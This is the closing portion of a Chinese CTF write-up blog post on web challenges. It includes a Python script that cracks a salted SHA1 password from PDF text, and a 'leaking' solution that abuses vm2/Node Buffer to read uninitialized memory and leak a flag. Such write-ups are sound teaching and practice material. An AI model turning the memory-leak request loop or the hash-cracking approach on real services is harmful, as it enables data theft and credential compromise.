+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">StringIO</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.pdfpage</span> <span class="kn">import</span> <span class="n">PDFPage</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.converter</span> <span class="kn">import</span> <span class="n">TextConverter</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.converter</span> <span class="kn">import</span> <span class="n">PDFPageAggregator</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.layout</span> <span class="kn">import</span> <span class="n">LTTextBoxHorizontal</span><span class="p">,</span> <span class="n">LAParams</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.pdfinterp</span> <span class="kn">import</span> <span class="n">PDFResourceManager</span><span class="p">,</span> <span class="n">PDFPageInterpreter</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">importlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.request</span> <span class="kn">import</span> <span class="n">urlopen</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.request</span> <span class="kn">import</span> <span class="n">Request</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_pdf</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s2">&#34;./&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="n">i</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;pdf&#34;</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">convert_pdf_to_txt</span><span class="p">(</span><span class="n">path_to_file</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rsrcmgr</span> <span class="o">=</span> <span class="n">PDFResourceManager</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">retstr</span> <span class="o">=</span> <span class="n">StringIO</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">codec</span> <span class="o">=</span> <span class="s1">&#39;utf-8&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">laparams</span> <span class="o">=</span> <span class="n">LAParams</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">device</span> <span class="o">=</span> <span class="n">TextConverter</span><span class="p">(</span><span class="n">rsrcmgr</span><span class="p">,</span> <span class="n">retstr</span><span class="p">,</span> <span class="n">codec</span><span class="p">,</span> <span class="n">laparams</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path_to_file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">interpreter</span> <span class="o">=</span> <span class="n">PDFPageInterpreter</span><span class="p">(</span><span class="n">rsrcmgr</span><span class="p">,</span> <span class="n">device</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">maxpages</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">caching</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pagenos</span><span class="o">=</span><span class="nb">set</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">page</span> <span class="ow">in</span> <span class="n">PDFPage</span><span class="o">.</span><span class="n">get_pages</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">pagenos</span><span class="p">,</span> <span class="n">maxpages</span><span class="o">=</span><span class="n">maxpages</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">,</span><span class="n">caching</span><span class="o">=</span><span class="n">caching</span><span class="p">,</span> <span class="n">check_extractable</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">interpreter</span><span class="o">.</span><span class="n">process_page</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="n">retstr</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">device</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">retstr</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_password</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pdf_path</span> <span class="o">=</span> <span class="n">get_pdf</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">pdf_path</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;Searching word in &#34;</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pdf_text</span> <span class="o">=</span> <span class="n">convert_pdf_to_txt</span><span class="p">(</span><span class="s2">&#34;./&#34;</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">pdf_text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sha1_password</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">(</span><span class="n">word</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;Salz!&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">sha1_password</span> <span class="o">==</span> <span class="s1">&#39;3fab54a50e770d830c0416df817567662a9dc85c&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;Find the password :&#34;</span> <span class="o">+</span> <span class="n">word</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">find_password</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" width="442" height="53" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-148.png" alt="" class="wp-image-3810" /> </figure></p>
+<h2 id="0x04-leaking">0x04 leaking</h2>
+<p>打开页面，分析代码。</p>
+<pre class="wp-block-code"><code>"use strict";
+
+var randomstring = require("randomstring");
+var express = require("express");
+var {
+    VM
+} = require("vm2");
+var fs = require("fs");
+
+var app = express();
+var flag = require("./config.js").flag
+
+app.get("/", function(req, res) {
+    res.header("Content-Type", "text/plain");
+
+    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
+    eval("var flag_" + randomstring.generate(64) + " = \"flag{" + flag + "}\";")
+    if (req.query.data && req.query.data.length &lt;= 12) {
+        var vm = new VM({
+            timeout: 1000
+        });
+        console.log(req.query.data);
+        res.send("eval ->" + vm.run(req.query.data));
+    } else {
+        res.send(fs.readFileSync(__filename).toString());
+    }
+});
+
+app.listen(3000, function() {
+    console.log("listening on port 3000!");
+});</code></pre>
+<p>完全没有头绪，参考<a href="https://blog.csdn.net/weixin_46676743/article/details/112669105" target="_blank" rel="noreferrer noopener" rel="nofollow" >wp</a>才知道这是道关于node.js沙箱逃逸的题，首先定义变量 flag，然后可以在沙箱里面执行任意的命令。如果我们能够构造请求，使得vm上下文代替我们去读取利用沙箱外的代码和变量的话，那就形成了沙箱逃逸。基本原理参考：<a rel="noreferrer noopener" href="https://juejin.cn/post/6889226643525599240" target="_blank" rel="nofollow" ><a href="https://blog.csdn.net/qq_41903941/article/details/109379205" target="_blank" rel="noopener noreffer ">https://blog.csdn.net/qq_41903941/article/details/109379205</a></a>。不过这题没用到原型链，直接用Buffer()函数用于读取内存的内容，可以通过这个函数直接去读取全局内存中的内容。在较早一点的node版本中(8.0之前),当 Buffer的构造函数传入数字时,会得到与数字长度一致的一个 Buffer,并且这个Buffer是未清零的。8.0之后的版本可以通过另一个函数Buffer. allocUnsafe(size)来获得未清空的内存。</p>
+<pre class="wp-block-code"><code># encoding=utf-8
+
+import requests
+import time
+url = 'http://your ip:port/?data=Buffer(500)'
+response = ''
+while 'flag' not in response:
+        req = requests.get(url)
+        response = req.text
+        print(req.status_code)
+        time.sleep(0.1)
+        if 'flag{' in response:
+            print(response)
+            break</code></pre>
+<p>由于内存的保护机制，并不是每一次都能读取到含有flag内容的代码的，多运行几次脚本就好了。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="971" height="271" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-149.png" alt="" class="wp-image-3816" /> </figure></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-09-17</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/" data-title="攻防世界web高手篇（021-025）" data-hashtags="CTF"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/" data-hashtag="CTF"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/" data-title="攻防世界web高手篇（021-025）"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/" data-title="攻防世界web高手篇（021-025）"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/" data-title="攻防世界web高手篇（021-025）"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">CTF</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021-09-16-%E6%89%93%E9%9D%B6-hackademic-rtb1/" class="prev" rel="prev" title="打靶-Hackademic: RTB1"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>打靶-Hackademic: RTB1</a>
+            <a href="/2021-09-24-%E9%95%BF%E5%9F%8E%E6%9D%AFwriteup/" class="next" rel="next" title="长城杯writeup">长城杯writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hannibal0x/blog-comment"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
